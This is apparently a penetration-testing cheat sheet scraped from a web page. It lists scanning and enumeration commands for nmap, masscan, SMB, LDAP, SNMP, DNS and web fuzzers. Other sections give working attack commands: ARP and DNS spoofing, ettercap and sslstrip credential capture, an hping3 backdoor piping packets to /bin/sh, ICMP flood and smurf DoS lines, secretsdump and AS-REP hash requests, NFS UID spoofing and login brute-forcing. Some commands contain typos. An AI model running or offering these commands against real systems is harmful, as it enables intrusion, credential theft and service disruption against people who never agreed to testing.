
# If masscan were nmap it would always have the below flags set
#  -sS: this does SYN scan only (currently, will change in the future)
#  -Pn: doesn't ping hosts first, which is fundamental to the async operation
#  -n: no DNS resolution happens
#  --randomize-hosts: scan completely randomized, always, you can't change this
#  --send-eth: sends using raw libpcap

# List nmap compatible options
masscan --nmap

# Scan Class A Subnet Range
sudo masscan -p80 10.0.0.0/8 --rate=1000 -e eth0 --router-ip 10.0.0.1

# Scan top 10 ports
masscan 10.0.0.0/16 ‐‐top-ten

# Scan top 100 ports using 1000 packets per second
masscan 10.0.0.0/16 ‐‐top-ports 100 ––rate 100000

# Scan every port
masscan 10.0.0.0/16 -p1-65535

# Scan and save results to file
masscan 10.0.0.0/16 ‐‐top-ports 100 ‐‐echo &gt; results.masscan

# Exclude IP addresses from scan
echo $'10.0.23.50\n10.67.89.10\n10.99.99.7' &gt;&gt; exclude.txt
masscan 10.0.0.0/16 ‐‐top-ports 100 ‐‐excludefile exclude.txt

# Assign Masscan a static IP on the local subnet to grab banners
masscan 10.0.0.0/8 -p80 --banners --source-ip 192.168.0.188

# Choose a non-conflicting source port
if grep -q 61000 "/proc/sys/net/ipv4/ip_local_port_range"; then echo "[x] Source port is being used"
else
    masscan 10.0.0.0/8 -p80 --banners --source-port 61000
fi
  debugger eval code:1:62
# NMAP SCRIPTS IN /usr/share/nmap/scripts

# Show all scripts in the default category
nmap --script-help default

# Display more info about a specific script
nmap --script-help nfs-ls

# Grep Ping Sweep
nmap -sn 10.0.0.1-254 -oG icmp-sweep.txt -v
grep Up icmp-sweep.txt | cut -d" " -f 2

# Grep HTTP Sweep
nmap -p 80 10.0.0.1-254 -oG http-sweep.txt
grep open http-sweep.txt | cut -d" " -f2

# Scan for TCP and UDP ports
nmap -sTU --top-ports 10.0.0.1

# Scan IP Range for Common TCP Ports
nmap -sT -A --top-ports=20 10.0.0.1-254 -oG top-port-sweep.txt

# Send fragmented packets during scan
nmap -f 10.0.0.1

# Specify the MTU
nmap --mtu 24 10.0.0.1

# Send dcoy IP's for scan
nmap -D RND:10 10.0.0.1
nmap -D 10.0.0.5,10.0.0.6,10.0.0.7 10.0.0.1

# Spoof MAC Address
nmap -sT -Pn --spoof-mac Dell 10.0.0.1
nmap -sT -Pn --spoof-mac Mac 10.0.0.1
nmap -sT -Pn --spoof-mac HP 10.0.0.1

# Aggressive Scan for Open Ports
nmap -A 10.0.0.1 --open

# Test Default Nmap Scripts on Open Ports and perform Banner Grabbing
nmap -sV 10.0.0.1

# Check for OS Version
nmap -O 10.0.0.1

# SYN Scan for Open Ports
nmap -sS 10.0.0.1 --open

# TCP Scan for Open Ports
nmap -sT 10.0.0.1 --open

# UDP Scan for Open Ports
nmap -Pn -sU 10.0.0.1 --open

# Return as much info as possible scan
nmap -sC -sV -O -A 10.0.0.1 -p- --open
  debugger eval code:1:62
# TCP Port scan. TCP SYN scan expects to receive SYN-ACK packets
nc -nvv -w 1 -z 10.0.0.1 3388-3390
# -w is for connection timeout in seconds
# -z is used to specify zero I/O mode which will send no data. Makes this a scan

# UDP Port Scan usually unreliable
nc -nv -u -z -w 1 10.0.0.1 160-162
# If port is closed we receive ICMP unreachable. If open the packet is forwarded to application laye
  debugger eval code:1:62
nmap -p 22 --script=ssh2-enum-algos.nse,ssh-auth-methods.nse,ssh-hostkey.nse,ssh-publickey-acceptance.nse,ssh-run.nse,sshv1.nse 10.0.0.1
debugger eval code:1:62
# ZONE TRANSFERS
host -l osbornepro.com dns-server.osbornepro.com
dig axfr @dns-server.osbornepro.com osbornepro.com
dnsrecon -d osbornepro.com -t axfr
dnsenum osbornepro.com
nmap --script=dns-zone-transfer -p 53 dns-server.osbornepro.com

# SUBDOMAIN ENUMERATION
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.osbornepro.com' -u http://10.0.0.1/ --hh $ValueToIgnore
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.osbornepro.com' -u http://10.0.0.1 --fw=842
dnsrecon -d osbornepro.com -D /tmp/subdomain-list.txt -t brt
    # -d is domain
    # -D is list to try
    # -t is type of enum to perform: brt is brute

# GET DNS SERVERS FOR DOMAIN
host -t ns osbornepro.com

# SPF INFO
nslookup osobrnepro.com type=txt
Resolve-DnsName -Name osbornepro.com -Type TXT

# DKIM LOOKUP
Get-DkimSigningConfig osbornepro.com # Works on Exchange Servers
nslookup -type=txt selector1._domainkey.osbornepro.com
Resolve-DnsName -Name selector1._domainkey.osbornepro.com -Type SOA

# DMARC LOOKUP
dig txt _dmarc.osbormepro.com
Resolve-DnsName -Name _dmarc.osbornepro.com -Type SOA

# LDAP LOOKUP
nslookup
type=all
_ldap._tcp.dc._msdcs.osbornepro.com
  debugger eval code:1:62
# Nmap
nmap -v -p 139,445 -oG smb.txt 10.0.0.1-254

# NBT Scan
nbtscan -r 10.0.0.0/24

# OS Discovery
nmap -v -p 139, 445 --script=smb-os-discovery 10.0.0.1

# NetBIOS Share Scanner
netbios-share-scanner 10.0.0.1

# NMBScan
nmbscan -h 10.0.0.1 -h 10.0.0.2 -h 10.0.0.3
nmbscan -h 10.0.0.{1..255}
  debugger eval code:1:62
# SmbMap Enumeration
smbmap -R -H 10.0.0.1

# Run SMB Nmap Scripts
nmap -p 139,445 --script=smb-os-discovery.nse,smb-mbenum.nse,smb2-capabilities.nse,smb2-security-mode.nse,smb-enum-*.nse,smb-security-mode.nse,smb-protocols.nse,smb-system-info.nse,smb-print-text.nse,smb-vuln-*.nse,smb-ls.nse  10.0.0.1\n"

# Check for Eternal Blue in SMB version
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.0.0.1

# Disover SMB Shares
nmap -v -p 139, 445 --script=smb-os-discovery 10.0.0.1

# GRAB SMB BANNER
# Start Listener
ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'

# Connect to Listener
smbclient -L 10.0.0.1 -U "" -N\n\n"
smblcient -N -U "guest" -L 10.0.0.1 \n"

# SAMBA CRY CHECK
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p 445 10.0.0.1
debugger eval code:1:62
# SMBMAP Access
smbmap -u rosborne -p Password123! -d osornepro.com -H 10.0.0.1

# IMPACKET Access
python /usr/share/doc/python3-impacket/examples/smbclient.py osbornepro.com//rosborne:'Password123!'@10.0.0.1 -port 445 [-no-pass]

# SMBClient Access
smbclient -U 'osbornepro.com/rosborne%passwordorhash' //10.0.0.1/C$ --pw-nt-hash [-N|--no-pass]
    debugger eval code:1:62
# Scan for port 111 open
nmap -v -p 111 10.0.0.1-254

# Use nmap script rpcinfo to enum ports off of 111
nmap -sV -p 111 --script=rpcinfo 10.0.0.1-254

# List scripts that deal with NFS
ls -1 /usr/share/nmap/scripts/nfs*

# Run ALL the nmap NFS scripts against a target
nmap -p 111 --script nfs* 10.0.0.1


# Mount an NFS Share for Browsing
mkdir /tmp/home
mount -o nolock 10.0.0.1:/home /users/kali/home/

# Once mounted create a user that can read any restricted files by changing their id and gid number
useradd fakeadmin -u 10014 -g 10014 -m -s /bin/bash
sudo sed -i -e 's/10014/10909/g' /etc/passwd
cd /users/kali/home
    debugger eval code:1:62
nmap -p 69 -sU --script=tftp-enum.nse 10.0.0.1
debugger eval code:1:62
nmap -p 143 --script=imap-capabilities.nse,imap-ntlm-info.nse 10.0.0.1
    debugger eval code:1:62
nmap -p 110 --script=pop3-capabilities.nse,pop3-ntlm-info.nse 10.0.0.1
debugger eval code:1:62
# GET EMAIL ADDRESSES IN A DOMIAN
theharvester -d osbornepro.com -l 500 -b all

# SMTP-USER-ENUM
smtp-user-enum -M VRFY -U /tmp/user.txt -t 10.0.0.1

# CONNECT TO SMTP AND VRFY USER
nc 192.168.0.5 25
VRFY John.smith

# METASPLOIT
auxiliary/scanner/smtp/smtp_enum
set rhosts 10.0.0.1
set rport 25
set USER_FILE /tmp/users.txt
exploit

# ISMTP
ismtp -h 10.0.0.1:25 -e /tmp/emails.txt
debugger eval code:1:62
#!/usr/bin/env python
import socket
import sys

if len(sys.argv) != 2:
         print "Usage: vrfy.py username"
         sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
connect = s.connect(('10.0.0.1',25))

# Receive the banner
banner = s.recv(1024)

print banner

# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)

print result

# Close the socket
s.close()
    debugger eval code:1:62
# NMAP
nmap -p 111 --script=rpcinfo.nse 10.0.0.1

# NBTSCAN
nbtscan 10.0.0.1-254

# ENUM4LINUX
enum4linux -a 10.0.0.1

# Nullinux
nullinux 10.0.0.1
nullinux 10.0.0.1 -U rosborne -P 'Password123!'
# Install nullinux
git clone https://github.com/m8r0wn/nullinux /usr/share/nullinux; cd nullinux; sudo bash /usr/share/nullinux/setup.sh

# RPCCLIENT
rpcclient
    srvinfo
    enumdomusers
    queryuser rosborne
    querydominfo
    getdompwinfo
    debugger eval code:1:62
nmap -p 3389 --script=rdp-enum-encryption.nse,rdp-ntlm-info.nse,rdp-vuln-ms12-020.nse 10.0.0.1

# Sticky Keys Hunter
stickyKeysHunter 10.0.0.1
# Install stickyKeyHunter
wget https://raw.githubusercontent.com/ztgrace/sticky_keys_hunter/master/stickyKeysHunter.sh; chmod u+x stickKeysHunter.sh; cp stickKeysHunter.sh /usr/local/sbin/stickyKeysHunter

# Enumerate RDP Security Settings
rdp-sec-check 10.0.0.1

# Install rdp-sec-check on Kali
sudo cpan
install Encoding::BER
Ctrl+d
wget https://raw.githubusercontent.com/portcullislabs/rdp-sec-check/master/rdp-sec-check.pl -P /usr/local/sbin/rdp-sec-check
chmod +x /usr/local/sbin/rdp-sec-check
rdp-sec-check --help
debugger eval code:1:62
nmap -p 5800,5900 --sciprt=vnc-info.nse --script=vnc-title.nse 10.0.0.1
debugger eval code:1:62
REMINDER: Before listening ensure traffic forwarding is enabled on machine
echo 1 &gt; /proc/sys/net/ipv4/ip_forward
(sets registry value to allow forwarding of traffic)

ARPSPOOF
arpspoof -i eth0 -t 192.168.0.37 192.168.0.35
(i = interface t = target last ipv4 address is spoofed identity)
(use this method for packet capture programs in a large enough network this can cause issues if the gateway is spoofed)

DNSSPOOF
dnsspoof -i eht0 -f fakednsresolutions.txt
(fakednsresolutions.txt should read 192.168.0.35 osbornepro.com)
NOTE: In order to use this tool run command "service apache2 start" in order to replace web page with custom web page. Best for http not SSL https.

ETTERCAP
ettercap -Ti eth0 -M arp:remote /192.168.0.37/ /192.168.0.35/
(this spoofs arp of 192.168.0.37. -Ti = text interface -M = set up for spoofing default gateway
NOTE: If an SSL warning is ignored and users input their password and username they are captured and displayed in clear text.

SSLSTRIPING
iptables -t nat -A PREROUTING -p tcp --destination-port80 -j REDIRECT --to-port 8080
(sets and iptables rule to pass traffice headed for port 80 thorugh SSL Strip which here is run on port 8080)
sslstrip -l 8080
(opens sslstrip and tells it to listen on port 8080)
NOTE: This bypasses any certificate warnings and captures credentials in clear text
      debugger eval code:1:62
wpscan --url http://10.0.0.1/wp-parent --enumerate ap,at,cb,dbe --api-token aa7aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -o wpscan.results
debugger eval code:1:62
# NIKTO SCAN =================================
nikto -h 10.0.0.1

# WEBDAV =================================
# Test default credentials
cadaver http://10.0.0.1/

# DIRB =================================
# Output results to /tmp/dirb-results.txt
dirb http://10.0.0.1/ -o /tmp/dirb-results.txt

# Search for .php file extensions
dirb http://10.0.0.1:8080/ -X .php

# Search for .php on files and folders in URI
dirb http://10.0.0.1/ -H .php

# Add 100 second delay in scans
dirb http://10.0.0.1/ -z 100

# Ignore Warning Messages for things such as non-listable directories
dirb http://10.0.0.1/ -w

# Ignore 302 Status Code
dirb http://10.0.0.1/ -N 302

# Do NOT Search recursively
dirb http://10.0.0.1/ -r

# Use basic authentication against pages
dirb http://10.0.0.1/login.php -u  admin:password

# Scan through a proxy
dirb http://10.0.0.1/ –p 127.0.0.1:8080

# GOBUSTER =================================
# Enumerate directory URIs
gobuster dir -u http://10.0.0.1:8080 -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'

# Enumerate subdomains
gobuster dns -d osbornepro.com -w wordlist.txt

# Enumerate subdomains and their IP
gobuster dns -d osbornepro.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -i

# Force processing of a domain that has wildcard entries
gobuster dns -d 0.0.1.osbornepro.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --wildcard

# VHOST enumeration
gobuster vhost -u http://osbornepro.com -w vhost-wordlist.txt

# WFUZZ =================================
# Fuzz for HTTP Verbs
wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://osbornepro.com/

# Fuzz credentials using basic authentication
wfuzz -z list,user-pass.lst --basic FUZZ:FUZZ https://osbornepro.com/login.aspx

# Fuzz recursively and save to file
wfuzz -f /tmp/outfile,json -z list,"admin-CVS-cgi\-bin" -R1 http://osbornepro.com/FUZZ

# Enumerate files and directories using color output (-c) and a SOCKS proxy
wfuzz -c -w wordlist.txt -u http://osbornepro.com/ -p localhost:1080:SOCKS5

# Test for an id value between 1 and 10000 using an HTTP proxy
wfuzz -c -v -z range,1-10000 http://osbornepro.com/index.php?id=FUZZ -p 127.0.0.1:8080

# Do not return 403 while looking for an id value between 0 and 2
wfuzz --hc 403 -c -z range,0-2 https://osbornepro.com/index.php?d=FUZZ

# Use the list payload and encode the passwords.txt value with MD5 hashes to enumerate the d value
wfuzz -c -z list,passwords.txt,md5 http://osbornepro.com/index.php?d=FUZZ

# Attempt password cracking via URL using two list payloads
wfuzz –z list,pass.lst –z list,user.txt http://osbornepro.com/user=FUZ2Z&amp;pass=FUZZ

# Attempt password cracking using defined values trying each variation
wfuzz –z list,pass1-pass –z list,user1-admin –s 1 http://osbornepro.com/user=FUZ2Z&amp;pass=FUZZ

# Fuzz for a cookie
wfuzz -z file,wordlist/general/common.txt -b cookie=FUZZ http://osbornepro.com/

# Fuzz with a cookie
wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://osbornepro.com/FUZZ
# EXAMPLE REQUEST FROM ABOVE
GET /a HTTP/1.1
Host: osbornepro.com
Accept: */*
Content-Type:  application/x-www-form-urlencoded
Cookie:  cookie=value1; cookie2=value2
User-Agent:  Wfuzz/2.2
Connection: close

# Fuzz for a headers value
wfuzz -z file,wordlist/general/common.txt -H "User-Agent: FUZZ" http://osbornepro.com/

# Fuzz with added and existing headers
wfuzz -z file,wordlist/general/common.txt -H "myheader: headervalue" -H "User-Agent: Googlebot-News" http://osbornepro.com/FUZZ
# EXAMPLE REQUEST FROM ABOVE
GET /a HTTP/1.1
Host: osbornepro.com
Accept: */*
Myheader:  headervalue
Content-Type:  application/x-www-form-urlencoded
User-Agent:  Googlebot-News
Connection: close

# FFUF =================================
# Enumerate files and directories recursively and output results to a file
ffuf -w wordlist.txt -u http://osbornepro.com/ -r -o results.txt

# Fuzz a JSON value in PUT request
ffuf -w wordlist.txt -X PUT -u http://osbornepro.com -H "Content-Type: application/json" -d "{'FUZZ':'test_val'}"

# Fuzz for specified file types only and save to HTML file
ffuf -w wordlist.txt -u http://osbornepro.com/FUZZ -e .aspx,.php,.txt,.html -o output.html -of html

# Fuzz for paramter ID value and ignore 404 and 400 status codes
ffuf -w /tmp/wordlist.txt -u https://osbornepro.com/index.php?id=FUZZ -fc 404,400

# Fuzz for header values and exclude results with 100 words in page using a 5 second time out
ffuf -w wordlist.txt -u http://osbornepro.com -H "X-Header: FUZZ" -fw 100 -timeout 5

# Fuzz using a custom User Agent and auto-calibration to obtain more accurate results
ffuf -w common.txt -H "User-Agent: Firefox" -u http://10.0.0.1/FUZZ -ac

# Fuzz with POST data and exclude results that have 20 lines
ffuf -w wordlist.txt -u http://osbornepro.com -X POST -d "var=FUZZ" -fl 20

# Fuzz for VHOST value for 60 seconds
ffuf -w vhosts.list -u http://osbornepro.com -H "Host: FUZZ" -maxtime 60

# Fuzz for subdomains with 60 second max time per job
ffuf -w sub-domains.txt -u http://osbornepro.com/ -H "Host: FUZZ.osbornepro.com" -maxtime-job 60

# Send post requests with FUZZ data
ffuf -w wordlist.txt -X POST -d “username=admin\&amp;password=FUZZ” -u http://osbornepro.com/FUZZ

# Fuzz using two wordlists with a one second delay between requets
ffuf -u https://Wordlist2/Wordlist1 -w url-list.txt:Wordlist1 domains-list.txt:Wordlist2 -p 1

# Fuzz for correct password
ffuf -w passwords.txt -X POST -d "username=admin\&amp;password=FUZZ\&amp;Login=Login" -u http://osbornepro.com/login.php

# Fuzz using a PHPSESSID cookie matching a 200 response code
ffuf -w common.txt -b "PHPSESSID=a4885a1d1802209109693054d94ae214; security=low" -u http://osbornepro.com/FUZZ -mc 200
debugger eval code:1:62
# BLOODHOUND
bloodhound-python -d osbornepro.com -u rosborne -p 'Password1' -gc dc01.osbornepro.com -c all -ns 10.0.0.1

# LDAPSEARCH (Unauthenticated)
ldapsearch -h 10.0.0.1 -x -b DC=osbornepro,DC=com &gt; ldapsearch.txt
ldapsearch -LLL -x -H ldap://dc01.osbornepro.com -b '' -s base '(objectclass=*)'

# LDAPSEARCH (Authenticated)
# Dump everything
ldapsearch -x -h 10.0.0.1 -D 'osbornepro.com\rosborne' -w 'Password123!' -b "DC=osbornepro,DC=com"
# Get Users
ldapsearch -x -h 10.0.0.1 -D 'osbornepro.com\rosborne' -w 'Password123' -b "CN=Users,DC=osbornepro,DC=com"
# Get Computers
ldapsearch -x -h 10.0.0.1 -D 'osbornepro.com\rosborne' -w 'Password123' -b "CN=Computers,DC=osbornepro,DC=com"
# Get Domain Admins
ldapsearch -x -h 10.0.0.1 -D 'osbornepro.com\rosborne' -w 'Password123' -b "CN=Domain Admins,CN=Users,DC=osbornepro,DC=com"

# NMAP
nmap --script=ldap-search.nse 10.0.0.1 -p389 -oN ldapsearch.results
nmap --script=ldap-rootdse.nse 10.0.0.1 -p389 -oN ldaprootdes.results

# IMPACKET
python samrdump.py 10.0.0.1
python secretsdump.py 10.0.0.1
python GetNPUsers.py osbornepro.com/ -usersfile user.list -format john -outputfile hashes.txt -request -dc-ip dc01.osbornepro.com

# LDAP Domain Dump
ldapdomaindump -u osbornepro.com\\rosborne -p 'Thestrokes23' -n 10.0.0.1 dc01.osbornepro.com

# LDAP over SSL Dump Using Python Script
# SCRIPT CONTENTS =========================
import ldap3
# Specify connection settings to server specifying the IP Address, Port and whether or not SSL is required
s = ldap3.Server(10.0.0.1,get_info=ldap3.ALL, port =636, use_ssl = True)
# Create connection to port 636 using ldap secure (SSL)
con = ldap3.Connection(s)
con.bind()
# Dump All LDAP, replace DOMAIN, DOMAIN, with the LDAP domain details, if the domain was mydomain.local, it would be DC=mydomain,DC=local
con.search(search_base='DC=OsbornePro,DC=com', search_filter='(&amp;(objectClass=*))', search_scope='*')
# Print returned query
print(con.entries)
# END SCRIPT =============================
debugger eval code:1:62
# Metasploit module to enum users
msf &gt; use Auxiliary/gather/Kerberos_enumusers

# Impacket Tool to enum users via Kerberos
GetADUsers.py -all osbornepro.com\rosborne -dc-ip 10.0.0.1
	      
# PowerShell Script
.\GetUserSPNs.p1

# Command Prompt
setspn -t NETBIOSDOMAINNAME -q */*
debugger eval code:1:62
# Enumerate open ports allowed by a firewall
hping3 -S 10.0.0.1 -c 10 -p ++1

# Add timestamp for filtering firewalls
hping3 -S 10.0.0.1 -p 80 --tcp-timestamp

# Check if UDP port is open
hping3 -2 10.0.0.1 -p 161 -c 1

# List for HTTP traffic on local interface
hping3 -9 HTTP -I eth0

# Intercept Google search queries on local interface
hping3 -9 "http://www.google.com/search?" --beep -I eth0

# Pipe received packets to create a backdoor
# Start Listner filtering for tag "secret"
hping3 -I eth1 -9 secret | /bin/sh
# Execute command on remote machine
hping3 -R 10.0.0.1 -e secret -E command_file -d 100 -c 1

TCP Send   : hping3 -V -1 -c 1 -p 80 -s 5050 10.0.0.1
UDP Send   : hping3 -V -2 -c 1 -p 80 -s 5051 10.0.0.1
SYN Send   : hping3 -V -S -c 1 -p 80 -s 5052 10.0.0.1
ACK Send   : hping3 -V -A -c 1 -p 80 -s 5053 10.0.0.1
FIN Send   : hping3 -V -F -c -1 -p 80 -s 5054 10.0.0.1
XMAS Send  : hping3 -V -M 0 -c 1 -p 80 -UPF -s 5055 10.0.0.1
NULL Send  : hping3 -V -Y -c 1 -p 80 -s 5056 10.0.0.1
Smurf Send : hping3 -V -1 --flood -a 10.0.0.1
DoS Send   : hping3 -V -1 --flood 10.0.0.1
debugger eval code:1:62
# NMAP
# Discovery of SNMP
sudo nmap -sU --open -p 161 10.0.0.1-254 -oG snmp-hosts.txt

# ONESIXTYONE
# Make a list of ip address
for ip in $(seq 1 254); do echo 10.0.0.$ip; done &gt; ip_list.txt
# Make a list of community names
echo $'private\npublic\nmanager' &gt;&gt; community.txt
# Perform the scan using your lists
onesixtyone -c community.txt -i ip_list.txt

# SNMPWALK
# -t Change the timeout period
# -c Give community name
# -v Version of snmp being used
# -m load a given list of MIBs
# -r retries
# -A passphase needed to authenticate
# -x use DES or AES protocol if used
# -M define a list of MIBs in a directory file
# -P allows the defining of MIB options

# Get a list of usernames from a windows machine
snmpwalk -c public -v1 -t 10 10.0.0.1 1.3.6.1.4.1.77.1.2.25

# Enumerate Windows processes
 snmpwalk -c public -v1 10.0.0.1 1.3.6.1.2.1.25.4.2.1.2

# Enumerate Open TCP Ports
snmpwalk -c public -v1 10.0.0.1 1.3.6.1.2.1.6.13.1.3

# Enumerate installed software
snmpwalk -c public -v1 10.0.0.1 1.3.6.1.2.1.25.6.3.1.2
    debugger eval code:1:62
USERS:  1.3.6.1.4.1.77.1.2.25
PROCESSES: 1.3.6.1.2.1.25.4.2.1.2
RUNNING PROGRAMS: 1.3.6.1.2.1.25.4.2.1.2
PROCESS PATHS: 1.3.6.1.2.1.25.4.2.1.4
STORAGE UNITS: 1.3.6.1.2.1.25.2.3.1.4
SOFTWARE NAME: 1.3.6.1.2.1.25.6.3.1.2
TCP LOCAL PORTS: 1.3.6.1.2.1.6.13.1.3
    debugger eval code:1:62
# Find all SUID files
find / -perm -u=s -type f 2&gt; /dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -user root -perm -4000 -print 2&gt;/dev/null

# Find all GUID files:
find / -perm +2000 -user root -type f -print 2&gt;/dev/null

# Find all SUID and SGID Files
find / -user root -6000 -type f 2&gt; /dev/null
    debugger eval code:1:62


